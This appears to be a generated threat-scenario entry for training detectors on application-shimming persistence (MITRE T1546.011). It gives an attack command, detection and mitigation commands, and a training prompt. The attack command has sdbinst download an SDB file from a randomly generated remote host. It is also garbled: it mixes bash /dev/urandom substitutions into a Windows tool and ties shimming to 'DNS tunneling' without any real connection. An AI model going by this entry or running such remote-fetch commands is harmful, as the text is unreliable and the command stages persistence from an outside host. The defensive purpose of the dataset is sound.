---
type: campaign
scenario_id: 433
tactic: Persistence
technique: "T1546.011: Application Shimming"
technique_id: T1546.011
tags: [campaign, lotl, persistence]
---

# Using sdbinst for DNS tunneling persistence via application shimming.

## Threat Description
Using sdbinst for DNS tunneling persistence via application shimming.

## Attack Command
```
sdbinst http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor sdbinst: `wmic process where name='sdbinst.exe' get commandline | findstr http`; Event ID 4688.

## Mitigation
Restrict sdbinst: `icacls %windir%\System32\sdbinst.exe /deny Everyone:RX`; Block SDB downloads: `netsh advfirewall firewall add rule name='Block sdbinst' dir=out program='%windir%\System32\sdbinst.exe' action=block`.

## AI Training Prompt
Train AI to detect application shimming for DNS tunneling persistence by analyzing sdbinst HTTP downloads, SDB files, and DNS query patterns; suggest SDB download restrictions.

## References
- MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
